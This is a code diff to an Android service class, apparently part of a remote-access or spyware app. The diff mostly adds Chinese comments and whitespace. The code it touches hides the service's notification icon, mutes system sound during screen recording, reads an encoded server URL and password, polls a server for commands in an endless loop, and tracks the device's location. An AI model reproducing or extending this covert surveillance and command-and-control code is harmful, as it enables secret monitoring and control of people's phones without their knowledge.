@@ -18,6 +18,7 @@ import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import android.app.Notification;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -115,15 +116,14 @@ public class MyService extends Service {
     @Override
     public void onStart(Intent intent, int startId) {
 //		Notification note= new Notification(0, "Service Started", System.currentTimeMillis());
-//		startForeground(startId, note); Create Icon in Notification Bar - Keep Commented
+//		startForeground(startId, note);// Create Icon in Notification Bar - Keep Commented
         super.onStart(intent, startId);
         Log.i("com.connect", "Start MyService");
-
         //允许在主线程中访问网络
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
         StrictMode.setThreadPolicy(policy);
         androidId = Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID);
-
+        //初始化相关参数至preferenceManager
         if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 0) < 1) {
             PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", timeout).commit();
         }
@@ -147,7 +147,6 @@ public class MyService extends Service {
         }
         //********************************************************************************************************************************************************
         threadPre.start();
-        //********************************************************************************************************************************************************
     }
 
     //********************************************************************************************************************************************************
@@ -205,6 +204,7 @@ public class MyService extends Service {
             URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT));
             password = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT));
 
+            //设置录屏时静音
             AudioManager mgr = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
             mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true);
         } catch (Exception e) {
@@ -214,9 +214,11 @@ public class MyService extends Service {
     }
 
     //********************************************************************************************************************************************************
+    //持续从服务器读取指令
     Thread thread = new Thread() {
         @Override
         public void run() {
+            //初始化消息队列
             Looper.prepare();
             int i = 0;
             while (true) {
@@ -525,6 +527,7 @@ public class MyService extends Service {
             longitude = location.getLongitude();
         }
     }
+
     //********************************************************************************************************************************************************
     private final LocationListener locationListener = new LocationListener() {
         public void onLocationChanged(Location location) {
@@ -541,6 +544,7 @@ public class MyService extends Service {
         public void onStatusChanged(String provider, int status, Bundle extras) {
         }
     };
+
     //********************************************************************************************************************************************************
 //	public class isUrlAlive extends AsyncTask<String, Void, String> {
 //		String i = "";
